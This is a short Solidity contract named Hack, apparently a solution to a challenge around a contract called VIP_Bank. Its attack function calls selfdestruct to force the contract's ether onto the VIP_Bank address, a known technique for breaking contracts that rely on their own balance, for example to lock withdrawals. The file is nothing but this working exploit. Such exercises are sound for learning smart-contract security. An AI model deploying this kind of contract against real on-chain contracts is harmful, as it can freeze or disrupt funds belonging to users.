// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.7;

import "./VIP_Bank.sol";

contract Hack {
    VIP_Bank vip;

    constructor(VIP_Bank _vip) {
        vip = VIP_Bank(_vip);
    }

    function attack() public payable {
        address payable addr = payable(address(vip));
        selfdestruct(addr);
    }
}
